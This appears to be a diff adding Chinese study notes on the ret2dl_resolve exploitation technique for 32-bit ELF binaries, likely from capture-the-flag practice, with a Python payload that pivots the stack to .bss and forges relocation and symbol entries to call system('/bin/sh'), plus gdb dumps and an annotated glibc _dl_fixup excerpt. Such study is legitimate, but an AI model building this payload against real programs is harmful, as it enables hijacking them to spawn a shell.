@@ -1,0 +1,124 @@
+
+1.把栈迁移到bss段
+
+2.把假的reloc_offset放到bss中
+
+3.跳到PLT[0]去执行
+
+栈应该如下：
+
+plt[0]
+reloc_offset=faker stack - rel_plt 让其指向bss段
+这里是指向一个fake_reloc
+
+fake_reloc 是一个结构体，其中有一个r_info也需要伪造，指向fake_sym
+这里的r_info是相对于SYMTAB的偏移，偏移到bss段就好啦
+然后fake_sym也是一个结构体，他有一个st_name也是一个偏移，相对STRTAB转到bss上的/bin/sh
+
+plt_0 = 0x08048310
+rel_plt = 0x080482cc
+index_offset = (stack_addr + 28) - rel_plt # reloc_offset
+write_got = elf.got['write']
+dynsym_addr = 0x080481cc
+dynstr_addr = 0x0804823c
+hack_dynsym_addr = stack_addr + 36 # fake_reloc
+align = 0x10 - ((hack_dynsym_addr - dynsym_addr) & 0xf)
+hack_dynsym_addr = hack_dynsym_addr + align
+index_dynsym_addr = (hack_dynsym_addr - dynsym_addr) / 0x10       #dynsym下标
+r_info = (index_dynsym_addr << 8) | 0x7
+hack_rel = p32(write_got) + p32(r_info)             #伪造reloc段
+st_name = (hack_dynsym_addr + 0x10) - dynstr_addr
+hack_dynsym = p32(st_name) + p32(0) + p32(0) + p32(0x12)    #伪造dynsym段
+
+#system("/bin/sh")
+payload2 = 'AAAA'
+payload2 += p32(plt_0)
+payload2 += p32(index_offset)
+payload2 += 'AAAA'
+payload2 += p32(stack_addr + 80)
+payload2 += 'AAAA'
+payload2 += 'AAAA'
+payload2 += hack_rel # stack_addr+28
+payload2 += 'A' * align
+payload2 += hack_dynsym # stack_addr+36+align
+payload2 += "system\x00"
+payload2 += 'A' * (80 - len(payload2))
+payload2 += "/bin/sh\x00"
+payload2 += 'A' * (100 - len(payload2))
+
+
+new stack here
+plt[0]
+reloc_offset              <-stack esp   , this reloc_offset need to located to fake_reloc
+'aaaa' ret address
+p32('bin/sh')
+fake_reloc:
+	p32:r_offset
+	p32:r_info->fake_sym
+fake_sym:
+	p32:fake_st_name->string
+	p32
+	p32
+	p32
+string
+
+
+ebp处就得处理好esp关系，直接过.bss
+
+->esp
+->ecx
+->ebp
+
+然后esp=ecx-4，那还是esp处的值，栈段伪造成这样：
+a*22+p32(ebp)+aa+p32(esp)+p32(ecx)+ebp+esp+p32(plt[0])+p32(reloc_offset)+p32(retnAddr)+fake_reloc+fake_sym
+a*22+b*4     +aa+c*4     +d*4     +B*4+C*4+eeee
+
+ecx:fake stack
+esp=ecx-4->new stack here
+ret
+
+JMPREL_in:0x080482B4
+reloc_offset_in:0x804a068
+
+reloc_offset=0x804a068-0x080482B4
+
+reloc_context:p32(GOT)+p32(r_info):r_info= sym in SYMTAB
+p32(0x804aa68)+p32(r_info)
+r_info=((0x804a074-0x080481cc)/0x10)<<8|0x7
+
+sym->st_name:0x804a078-0x0804822C
+
+
+SYMTAB_in:0x080481cc
+STRTAB_in:0x0804822C
+
+0000| 0x804a064 ("BBBBCCCCeeee")->PLT[0]
+0004| 0x804a068 ("CCCCeeee")->offset
+0008| 0x804a06c ("eeee")->REL
+0012| 0x804a070 --> 0x0 ->REL->r_info
+0016| 0x804a074 --> 0x0 ->SYM->st_name
+0020| 0x804a078 --> 0x0 ->"system"
+0024| 0x804a07c --> 0x0 ->"/bin/sh"
+0028| 0x804a080 --> 0x0
+
+_dl_fixup(struct link_map *l, ElfW(Word) reloc_arg)
+{
+    // 首先通过参数reloc_arg计算重定位入口，这里的JMPREL即.rel.plt，reloc_offset即reloc_arg
+    const PLTREL *const reloc = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);
+    // 然后通过reloc->r_info找到.dynsym中对应的条目
+    const ElfW(Sym) *sym = &symtab[ELFW(R_SYM) (reloc->r_info)];
+    // 这里还会检查reloc->r_info的最低位是不是R_386_JUMP_SLOT=7
+    assert (ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT);
+    // 接着通过strtab+sym->st_name找到符号表字符串，result为libc基地址
+    result = _dl_lookup_symbol_x (strtab + sym->st_name, l, &sym, l->l_scope, version, ELF_RTYPE_CLASS_PLT, flags, NULL);
+    // value为libc基址加上要解析函数的偏移地址，也即实际地址
+    value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS (result) + sym->st_value) : 0);
+    // 最后把value写入相应的GOT表条目中
+    return elf_machine_fixup_plt (l, result, reloc, rel_addr, value);
+}
+首先通过link_map访问.dynamic节段，并获得.dynstr, .dynsym, .rel.plt节段的地址
+.rel.plt + reloc_arg(第二个参数(导入函数在.rel.plt中的偏移))求出对应函数重定位表项Elf32_Rel的指针
+利用此指针得到对应函数的r_info，r_info >> 8作为.dynsym的下标，求出当前函数的符号表项Elf32_Sym的指针
+利用Elf32_Sym的指针得到对应的st_name，.dynstr + st_name即为符号名字符串指针
+在动态链接库查找这个函数，并且把地址赋值给.rel.plt中对应条目的r_offset：指向对应got表的指针
+赋值给GOT表后，把控制权返还给write
